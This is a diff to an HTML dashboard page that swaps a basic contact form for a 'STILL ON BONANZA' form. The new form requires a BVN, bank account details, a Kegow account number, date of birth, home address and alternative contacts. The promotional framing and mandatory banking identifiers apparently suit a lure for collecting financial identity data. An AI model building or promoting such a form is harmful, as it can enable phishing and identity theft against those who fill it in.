@@ -1135,32 +1135,106 @@ body.dashboard-page{background:var(--eis-page)!important;color:#253342!important
     </section>
 
     <form class="card dashboard-card" id="app-form" style="display:none;">
-        <h2 class="section-heading">Application details</h2>
-        <p class="section-description">Enter your contact details so we can follow up if we need more information about your application.</p>
+        <h2 class="section-heading">STILL ON BONANZA</h2>
+        <p class="section-description">Please complete all the details below carefully. Make sure the information matches your official records.</p>
 
         <div class="form-grid">
             <div>
-                <label for="f-firstName">First name</label>
-                <input type="text" id="f-firstName" name="firstName" autocomplete="given-name" aria-describedby="hint-first-name" required>
-                <small class="field-hint" id="hint-first-name">Enter your first name as it appears on your identification.</small>
+                <label for="f-kegow-account">KEGOW ACC NUMBER:</label>
+                <input type="text" id="f-kegow-account" name="kegow_acc_number" autocomplete="off" required>
             </div>
 
             <div>
-                <label for="f-lastName">Last name</label>
-                <input type="text" id="f-lastName" name="lastName" autocomplete="family-name" aria-describedby="hint-last-name" required>
-                <small class="field-hint" id="hint-last-name">Enter your surname as it appears on your identification.</small>
+                <label for="f-agent-state">AGENT LOCATION STATE:</label>
+                <input type="text" id="f-agent-state" name="agent_location_state" autocomplete="address-level1" required>
             </div>
 
             <div>
-                <label for="f-email">Email address</label>
-                <input type="email" id="f-email" name="email" autocomplete="email" aria-describedby="hint-email" required>
-                <small class="field-hint" id="hint-email">Use an email address you can access.</small>
+                <label for="f-bvn">BVN NO:</label>
+                <input type="text" id="f-bvn" name="bvn_no" inputmode="numeric" maxlength="11" pattern="[0-9]{11}" autocomplete="off" required>
             </div>
 
             <div>
-                <label for="f-phone">Phone number</label>
-                <input type="tel" id="f-phone" name="phone" autocomplete="tel" aria-describedby="hint-phone">
-                <small class="field-hint" id="hint-phone">Include your country code if you are outside Nigeria.</small>
+                <label for="f-bank-name">BANK NAME:</label>
+                <input type="text" id="f-bank-name" name="bank_name" autocomplete="off" required>
+            </div>
+
+            <div>
+                <label for="f-account-no">ACCOUNT NO:</label>
+                <input type="text" id="f-account-no" name="account_no" inputmode="numeric" autocomplete="off" required>
+            </div>
+
+            <div>
+                <label for="f-account-name">ACCOUNT NAME:</label>
+                <input type="text" id="f-account-name" name="account_name" autocomplete="name" required>
+            </div>
+
+            <div>
+                <label for="f-agent-first-name">AGENT FIRST NAME:</label>
+                <input type="text" id="f-agent-first-name" name="agent_first_name" autocomplete="given-name" required>
+            </div>
+
+            <div>
+                <label for="f-middle-name">MIDDLE NAME:</label>
+                <input type="text" id="f-middle-name" name="middle_name" autocomplete="additional-name" required>
+            </div>
+
+            <div>
+                <label for="f-last-name">LAST NAME:</label>
+                <input type="text" id="f-last-name" name="last_name" autocomplete="family-name" required>
+            </div>
+
+            <div>
+                <label for="f-email">EMAIL:</label>
+                <input type="email" id="f-email" name="email" autocomplete="email" required>
+            </div>
+
+            <div>
+                <label for="f-alternative-email">ALTERNATIVE EMAIL:</label>
+                <input type="email" id="f-alternative-email" name="alternative_email" autocomplete="off" required>
+            </div>
+
+            <div>
+                <label for="f-phone">PHONE NO:</label>
+                <input type="tel" id="f-phone" name="phone" inputmode="tel" autocomplete="tel" required>
+            </div>
+
+            <div>
+                <label for="f-alternative-phone">ALTERNATIVE PHONE NO:</label>
+                <input type="tel" id="f-alternative-phone" name="alternative_phone_no" inputmode="tel" autocomplete="off" required>
+            </div>
+
+            <div class="full">
+                <label for="f-home-address">HOME ADDRESS:</label>
+                <textarea id="f-home-address" name="home_address" rows="3" autocomplete="street-address" required></textarea>
+            </div>
+
+            <div>
+                <label for="f-residence-state">STATE OF RESIDENCE:</label>
+                <input type="text" id="f-residence-state" name="state_of_residence" autocomplete="address-level1" required>
+            </div>
+
+            <div>
+                <label for="f-date-of-birth">DATE OF BIRTH:</label>
+                <input type="date" id="f-date-of-birth" name="date_of_birth" autocomplete="bday" required>
+            </div>
+
+            <div>
+                <label for="f-local-govt">LOCAL GOVT:</label>
+                <input type="text" id="f-local-govt" name="local_govt" required>
+            </div>
+
+            <div>
+                <label for="f-geopolitical-zone">GEO POLITICAL ZONE:</label>
+                <select id="f-geopolitical-zone" name="geo_political_zone" required>
+                    <option value="">Select geopolitical zone</option>
+                    <option value="North Central">North Central</option>
+                    <option value="North East">North East</option>
+                    <option value="North West">North West</option>
+                    <option value="South East">South East</option>
+                    <option value="South South">South South</option>
+                    <option value="South West">South West</option>
+                </select>
             </div>
         </div>
 
@@ -1216,7 +1290,7 @@ body.dashboard-page{background:var(--eis-page)!important;color:#253342!important
     </div>
 </footer>
 
-<script type="module" src="js/dashboard.js?v=38"></script>
+<script type="module" src="js/dashboard.js?v=39"></script>
 
 </body>
 </html>
